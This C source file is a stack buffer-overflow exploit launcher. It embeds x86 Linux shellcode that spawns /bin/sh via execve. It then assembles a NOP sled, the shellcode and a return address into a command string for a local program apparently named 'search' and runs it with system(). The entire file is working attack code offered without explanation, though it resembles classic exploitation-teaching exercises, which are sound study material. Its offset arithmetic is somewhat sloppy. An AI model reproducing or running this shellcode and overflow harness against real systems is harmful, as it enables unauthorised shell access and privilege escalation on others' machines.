#include <stdio.h>
#include <stdlib.h>
#include <string.h>

char shellcode[] = 	"\xeb\x1d\x5b\x31\xc0\x67\x89\x43\x07\x67\x89\x5b\x08\x67\x89\x43\x0c"\
					"\x31\xc0\xb0\x0b\x67\x8d\x4b\x08\x67\x8d\x53\x0c\xcd\x80\xe8\xde\xff"\
					"\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x4e\x41\x41\x41\x41\x42\x42\x42"\
					"\x42";

void usage(char *program)
{
	printf("Usage: %s <nop sled> <return address>\n", program);
	exit(0);
}

int main(int argc, char **argv) 
{
	char command[500], *ret, *nop;

	if (argc != 3)
		usage(argv[0]);

	ret = (char *) malloc(400); strcpy(ret, argv[2]); //set return address
	nop = (char *) malloc(300); strcpy(nop, argv[1]); //build NOP sled
	
	strcpy(command, "search \'"); // Start command buffer.

	printf("NOP: %d, shellcode: %d, ret: %d\n", strlen(nop), strlen(shellcode), strlen(ret));	

	memcpy(command+7, nop, strlen(nop));
	memcpy(command+strlen(nop)+7, shellcode, strlen(shellcode));
	memcpy(command+strlen(shellcode)+strlen(nop)+7, ret, strlen(ret));

	printf("%d\n", strlen(command));
	system(command); // Run exploit.

	free(ret); free(nop);
	return 0;
}
